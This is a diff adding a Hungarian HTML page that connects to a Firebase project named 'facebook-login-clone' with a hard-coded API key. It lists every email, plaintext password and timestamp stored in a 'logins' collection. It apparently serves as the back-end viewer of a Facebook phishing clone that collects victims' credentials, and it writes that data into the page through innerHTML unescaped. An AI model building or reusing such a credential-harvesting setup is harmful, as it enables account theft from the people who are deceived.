@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bejelentkezési adatok</title>
+</head>
+<body>
+    <h2>Bejelentkezési adatok</h2>
+    <ul id="output"></ul>
+
+    <!-- Firebase SDK és beállítások -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-analytics.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBmaAx_VUxqwqNplj5Hl2cz3yUgIbcWjzk",
+            authDomain: "facebook-login-clone-50fdb.firebaseapp.com",
+            projectId: "facebook-login-clone-50fdb",
+            storageBucket: "facebook-login-clone-50fdb.firebasestorage.app",
+            messagingSenderId: "73064234524",
+            appId: "1:73064234524:web:c45a8964b7a5147858a9d9",
+            measurementId: "G-4PPCW47F5Y"
+        };
+
+        // Firebase inicializálása
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const analytics = getAnalytics(app);
+
+        // Adatok lekérése és megjelenítése
+        async function loadData() {
+            const output = document.getElementById("output");
+            const querySnapshot = await getDocs(collection(db, "logins"));
+
+            querySnapshot.forEach((doc) => {
+                const data = doc.data();
+                const li = document.createElement("li");
+                li.innerHTML = `Email: ${data.email} | Jelszó: ${data.password} | Dátum: ${new Date(data.timestamp.seconds * 1000).toLocaleString()}`;
+                output.appendChild(li);
+            });
+        }
+
+        loadData();
+    </script>
+</body>
+</html>
